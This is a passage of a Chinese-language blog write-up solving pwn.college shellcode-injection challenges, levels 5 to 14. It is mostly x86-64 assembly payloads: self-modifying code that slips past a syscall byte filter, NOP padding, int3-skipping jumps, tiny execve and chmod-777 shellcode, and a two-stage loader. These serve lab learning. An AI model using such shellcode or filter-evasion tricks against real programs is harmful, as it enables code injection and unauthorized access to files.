+<p>This challenge requires that your shellcode does not have any <code>syscall</code>​, ‘sysenter’, or <code>int</code>​ instructions. System calls<br>are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05<br>(<code>syscall</code>​), 0f34 (<code>sysenter</code>​), and 80cd (<code>int</code>​). One way to evade this is to have your shellcode modify itself to<br>insert the <code>syscall</code>​ instructions at runtime.</p>
+</blockquote>
+<p>‍</p>
+<p>不允許直接使用 syscall，不過可以加密。</p>
+<p>由於syscall是 <code>0x0f 05</code>​，因爲他只是檢測我的shellcode，有沒有包含 <code>0x0f05</code>​ 而已，我可以先把它改成 <code>0x0e05</code>​ 或者是 <code>0x0f04</code>​ 之類的，在運行的過程中還原成syscall就可以了。</p>
+<p>所以： syscall 會變成如下：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">0x0e</span> <span class="number">0x05</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>]</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x0e</span>, <span class="number">0x05</span></span><br><span class="line"></span><br><span class="line"># <span class="number">0x0f</span> <span class="number">0x04</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">1</span>]</span><br><span class="line"><span class="meta">.byte</span> <span class="number">0x0f</span>, <span class="number">0x04</span></span><br></pre></td></tr></table></figure>
+
+<p>當然還有很多，你可以用乘法除法等，下面是簡單的版本：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # craft flag</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # open (<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0e</span>, <span class="number">0x05</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # send file to stdout</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">40</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>,<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0e</span>, <span class="number">0x05</span></span><br><span class="line">    # exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0e</span>, <span class="number">0x05</span></span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p>難度增加版的 Level 5</p>
+<blockquote>
+<p>This challenge requires that your shellcode does not have any <code>syscall</code>​, ‘sysenter’, or <code>int</code>​ instructions. System calls<br>are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05<br>(<code>syscall</code>​), 0f34 (<code>sysenter</code>​), and 80cd (<code>int</code>​). One way to evade this is to have your shellcode modify itself to<br>insert the <code>syscall</code>​ instructions at runtime.</p>
+</blockquote>
+<p>然後有一行是：</p>
+<blockquote>
+<p>Removing write permissions from first 4096 bytes of shellcode.</p>
+</blockquote>
+<p>最大輸入0x2000，在0x1000前的shellcode無法本身修改，所以前面可以用nop填充：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727094749-y76ybd5.png" alt="image">​</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # 填充 <span class="number">0x1000</span> 個 <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .REPT</span> <span class="number">0x1000</span></span><br><span class="line">    <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .ENDR</span></span><br><span class="line"></span><br><span class="line">    # craft flag</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x67616c662f</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # open (<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">2</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rsi</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">1</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0f</span>, <span class="number">0x04</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # send file to stdout</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">rsi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>,<span class="number">40</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>,<span class="number">1</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdx</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">r10</span>,<span class="number">1000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span> +<span class="number">1</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0f</span>, <span class="number">0x04</span></span><br><span class="line">    # exit</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">60</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">inc</span> <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">1</span>]</span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0f</span>, <span class="number">0x04</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><blockquote>
+<p>This challenge is about to execute the following shellcode:</p>
+<pre><code>  Address      |                      Bytes                    |          Instructions
+</code></pre>
+<p>0x000000002c58a000 | 31 32                                         | xor dword ptr [rdx], esi<br>0x000000002c58a002 | 33 0a                                         | xor ecx, dword ptr [rdx]</p>
+<p>This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need<br>to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.</p>
+<p>This challenge is about to close stderr, which means that you will not be able to use file descriptor 2 for output.</p>
+<p>This challenge is about to close stdout, which means that you will not be able to use file descriptor 1 for output. You<br>will see no further output, and will need to figure out an alternate way of communicating data back to yourself.</p>
+</blockquote>
+<p>沒辦法輸出任何東西，不過目前有兩種思路，第一種是直接暴力chmod 777 ，第二種是讀取flag，然後寫到本地文件。</p>
+<p>第一種相對來説好像比較簡單，所以使用第一種吧：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"></span><br><span class="line">    # open execve</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>, [<span class="built_in">rip</span>+_file]</span><br><span class="line"></span><br><span class="line">    # 填入一個 null <span class="built_in">byte</span> 表示結尾</span><br><span class="line">    <span class="keyword">push</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    # 依次把地址填入stack中</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rax</span>, [<span class="built_in">rip</span> + _flag]</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rax</span>, [<span class="built_in">rip</span> + _argv1]</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rax</span>, [<span class="built_in">rip</span> + _file]</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    # 引用 <span class="built_in">RSP</span> 地址</span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rsi</span>, [<span class="built_in">rsp</span>]</span><br><span class="line"></span><br><span class="line">    # 清空<span class="built_in">rdx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">rdx</span>, <span class="built_in">rdx</span></span><br><span class="line"></span><br><span class="line">    # execve</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="number">0x3b</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_file:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;/bin/chmod&quot;</span></span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_argv1:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;777&quot;</span></span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_flag:</span></span><br><span class="line"><span class="meta">    .ascii</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line"><span class="meta">    .byte</span> <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+
+<p>然後就可以ssh上去 <code>cat /flag</code>​，結束。</p>
+<p>‍</p>
+<h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><blockquote>
+<p>This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them<br>as code! This is a common exploitation scenario, called <code>code injection</code>​. Through this series of challenges, you will<br>practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing<br>other tricks, this will sanitize all environment variables and arguments and close all file descriptors &gt; 2.</p>
+<p>Mapped 0x1000 bytes for shellcode at 0x2541b000!<br>Reading 0x12 bytes from stdin.</p>
+</blockquote>
+<p>只可以讀取 18 byte，可以用一個軟連接來減少字節，比如説 <code>/flag</code>​ -&gt; <code>t</code>​。System call 有一個 chmod，可以使用這個來chmod 777，然後讀取flag。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727130441-mo63hiw.png" alt="image">​</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # t</span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x74</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>] </span><br><span class="line">    # <span class="number">777</span> 權限</span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="number">0777</span></span><br><span class="line">    # chmod </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><blockquote>
+<p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>​, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p>
+<p>Removing write permissions from first 4096 bytes of shellcode.</p>
+</blockquote>
+<p>‍</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727152717-hrw4kq2.png" alt="image">​</p>
+<p>他會在10個字節后加入10個int3，需要跳過這些int3 否則程序會crash，所以就如下：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x74</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>] </span><br><span class="line">    <span class="keyword">jmp</span> a</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">    .fill</span> <span class="number">12</span>,<span class="number">1</span>,<span class="number">0x90</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">a:</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="number">0777</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">jmp</span> b</span><br><span class="line"><span class="meta">    .fill</span> <span class="number">14</span>,<span class="number">1</span>,<span class="number">0x90</span></span><br><span class="line"><span class="symbol">  </span></span><br><span class="line"><span class="symbol">b:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><blockquote>
+<p>This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort<br>(e.g., the LSB being the right-most byte).</p>
+<p>This sort processed your shellcode 8 bytes at a time.</p>
+</blockquote>
+<p>‍</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727153408-m90p3yt.png" alt="image">​</p>
+<p>跟 level 8 的代碼一樣。</p>
+<h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><blockquote>
+<p>This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort<br>(e.g., the LSB being the right-most byte).</p>
+</blockquote>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727153529-45qt12g.png" alt="image">​</p>
+<p>跟 level 8 的代碼一樣。</p>
+<p>‍</p>
+<h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><p>shellcode 的 byte 不可以重複，</p>
+<p>那就是用 32和64切換，這樣就可以大大的改變byte的數字。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2024/07-pwn-college-shellcode/image-20240727154321-jo8ov5q.png" alt="image">​</p>
+<p>所以：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x74</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0777</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p>只允許 12 bytes，但是最短的execve剛好在12 bytes左右：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    # execve (<span class="string">&quot;m&quot;</span>)</span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x6d</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">esi</span>, <span class="built_in">esi</span></span><br><span class="line">    <span class="keyword">cdq</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>,<span class="number">0x3b</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<p>所以可以寫一個匯編，讓 m 去給 t 增加 777的權限，剛好t是 <code>/flag</code>​的軟連接：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x74</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0777</span></span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<p>運行后就得到 flag。</p>
+<h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p>只有 <code>6 bytes</code>​</p>
+<p>需要用gdb debug一下。</p>
+<p>可以利用syscall來打開文件，然後寫入堆棧，syscall裏的0是open，然後rsi是堆棧。</p>
+<p>所以可以製作一個 shell code loader: </p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">edx</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<p>所以下面才是真正的shellcode：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.intel_syntax</span> noprefix</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">.section</span> .text</span><br><span class="line"><span class="meta">.global</span> _start</span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="meta">    .rept</span> <span class="number">20</span></span><br><span class="line">        <span class="keyword">nop</span></span><br><span class="line"><span class="meta">    .endr</span></span><br><span class="line">    <span class="keyword">push</span> <span class="number">0x74</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>] </span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">esi</span>, <span class="number">0777</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x5a</span></span><br><span class="line">    <span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
+
+<p>分別編譯成兩個文件，然後：</p>
+<p>其中1是loader，2是shellcode：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objcopy --dump-<span class="meta">section</span> .text=<span class="number">1.</span>txt <span class="number">1.</span>bin</span><br><span class="line">objcopy --dump-<span class="meta">section</span> .text=<span class="number">2.</span>txt <span class="number">2.</span>bin </span><br><span class="line">cat <span class="number">1.</span>txt <span class="number">2.</span>txt | /challenge/babyshell_level14</span><br></pre></td></tr></table></figure>
+
+<p>運行后就可以 <code>cat /flag</code>​啦。</p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Review-How-to-Write-a-shellcode"><span class="toc-number">1.</span> <span class="toc-text">Quick Review: How to Write a shellcode ?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-1"><span class="toc-number">2.</span> <span class="toc-text">Level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-2"><span class="toc-number">3.</span> <span class="toc-text">Level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lebel-3"><span class="toc-number">4.</span> <span class="toc-text">Lebel 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-4"><span class="toc-number">5.</span> <span class="toc-text">Level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-5"><span class="toc-number">6.</span> <span class="toc-text">Level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-6"><span class="toc-number">7.</span> <span class="toc-text">Level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-7"><span class="toc-number">8.</span> <span class="toc-text">Level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-8"><span class="toc-number">9.</span> <span class="toc-text">Level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-9"><span class="toc-number">10.</span> <span class="toc-text">Level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-10"><span class="toc-number">11.</span> <span class="toc-text">Level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-11"><span class="toc-number">12.</span> <span class="toc-text">Level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-12"><span class="toc-number">13.</span> <span class="toc-text">Level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-13"><span class="toc-number">14.</span> <span class="toc-text">Level 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-14"><span class="toc-number">15.</span> <span class="toc-text">Level 14</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/07/27/2024/0727-pwn-college-shellcode-injection/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
